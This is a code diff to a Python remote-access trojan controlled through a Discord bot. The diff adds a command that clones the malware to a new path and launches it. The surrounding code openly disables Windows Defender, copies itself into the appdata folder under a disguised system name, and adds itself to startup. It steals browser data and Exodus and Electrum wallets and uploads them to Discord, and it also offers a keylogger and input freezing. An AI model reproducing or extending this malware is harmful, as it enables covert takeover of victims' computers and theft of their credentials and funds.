@@ -15,8 +15,10 @@ from modules.startup import Startup
 
 
 if ANTIDEBUG:
-    try: Antidebug
-    except: pass
+    try:
+        Antidebug
+    except:
+        pass
 
 def disable_defender():
     #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
@@ -31,12 +33,13 @@ if DEFENDER:
 
 
 def copyfile(file, target):
-    with open(file, "rb") as f:
-        bins = f.read()
-        
-    with open(target, "wb") as f:
-        f.write(bins)
+    try:
+        with open(file, "rb") as f:
+            bins = f.read()
 
+        with open(target, "wb") as f:
+            f.write(bins)
+    except: return
 
 file_dir = sys.argv[0]
 
@@ -55,11 +58,15 @@ def move():
         try:
             os.chdir(target_dir)
             subprocess.Popen(f"{target_dir}\SystemBin_64bit.exe", shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
+            os.chdir(os.path.dirname(sys.argv[0]))
             sys.exit(0)
         except:
             pass
+        os.chdir(os.path.dirname(sys.argv[0]))
     except:
+        os.chdir(os.path.dirname(sys.argv[0]))
         return
+    
     
 if MOVE and file_dir[:1].upper() + file_dir[1:] != f"{os.getenv('appdata')}\MicrosoftWindows\System\SystemBin_64bit.exe":
     move()
@@ -100,8 +107,9 @@ commands = "\n".join([
     "startup - Add to startup",
     "browser - Get browser data",
     "wallet - Get wallet information",
-    "keylogger - Enable keylogger -- WIP -- !cant be stoped, only thru reboot or shutdown!",
+    "keylogger - Enable keylogger -- WIP -- !cant be stopped, only thru reboot or shutdown!",
     "freeze <1/0> - Freeze all inputs from keyboard and mouse",
+    "clone <path> - Clone the malware to the specified path, make sure to enter path whit name of the output file",
     "!quit - Exit session without deleting all the data",
     "!exit - Exit session and delete all data"
 ])
@@ -122,7 +130,7 @@ async def wallets(channel):
 
         try:
             with open("Exodus.zip", "rb") as wallet:
-                wallet_zip = discord.File(wallet, filename="Exodus.zip")
+                wallet_zip = discord.File(wallet, filename=os.path.basename(file))
                 await channel.send(file=wallet_zip)
         except:
             embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
@@ -145,7 +153,7 @@ async def wallets(channel):
 
         try:
             with open("Electrum.zip", "rb") as wallet:
-                wallet_zip = discord.File(wallet, filename="Electrum.zip")
+                wallet_zip = discord.File(wallet, filename=os.path.basename(file))
                 await channel.send(file=wallet_zip)
         except:
             embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
@@ -229,6 +237,7 @@ async def on_ready():
     await channel.send(embed=embed)
     delete_files(["system.txt"])
     #browsers(channel)
+
 
 @client.event
 async def on_message(message):    
@@ -575,6 +584,38 @@ async def on_message(message):
                 freezed = False
                 await message.reply("Inputs are unfrezzed!")
         
+
+    elif message.content.startswith("clone "):
+        path = message.content[6:]
+        _, extension = os.path.splitext(path)
+        dir = os.path.dirname(path)
+        
+
+        if not os.path.exists(dir):
+            await message.reply("Invalid path, please try again with valid path!")
+            return
+
+        if extension != ".exe":
+            await message.reply("Invalid extension, please try again with valid extension(.exe)!")
+            return
+
+        try:            
+            #shutil.copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")
+            copyfile(sys.argv[0], path)
+
+            try:
+                os.chdir(dir)
+                subprocess.Popen(path, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
+            except:
+                await message.reply("Failed to clone the malware, please try again and make sure to use valid path!")
+                os.chdir(os.path.dirname(sys.argv[0]))
+                return
+        except:
+            await message.reply("Failed to clone the malware, please try again and make sure to use valid path!")
+            os.chdir(os.path.dirname(sys.argv[0]))
+            return
+        os.chdir(os.path.dirname(sys.argv[0]))
+
         
     elif message.content == "!quit":
         await client.close()
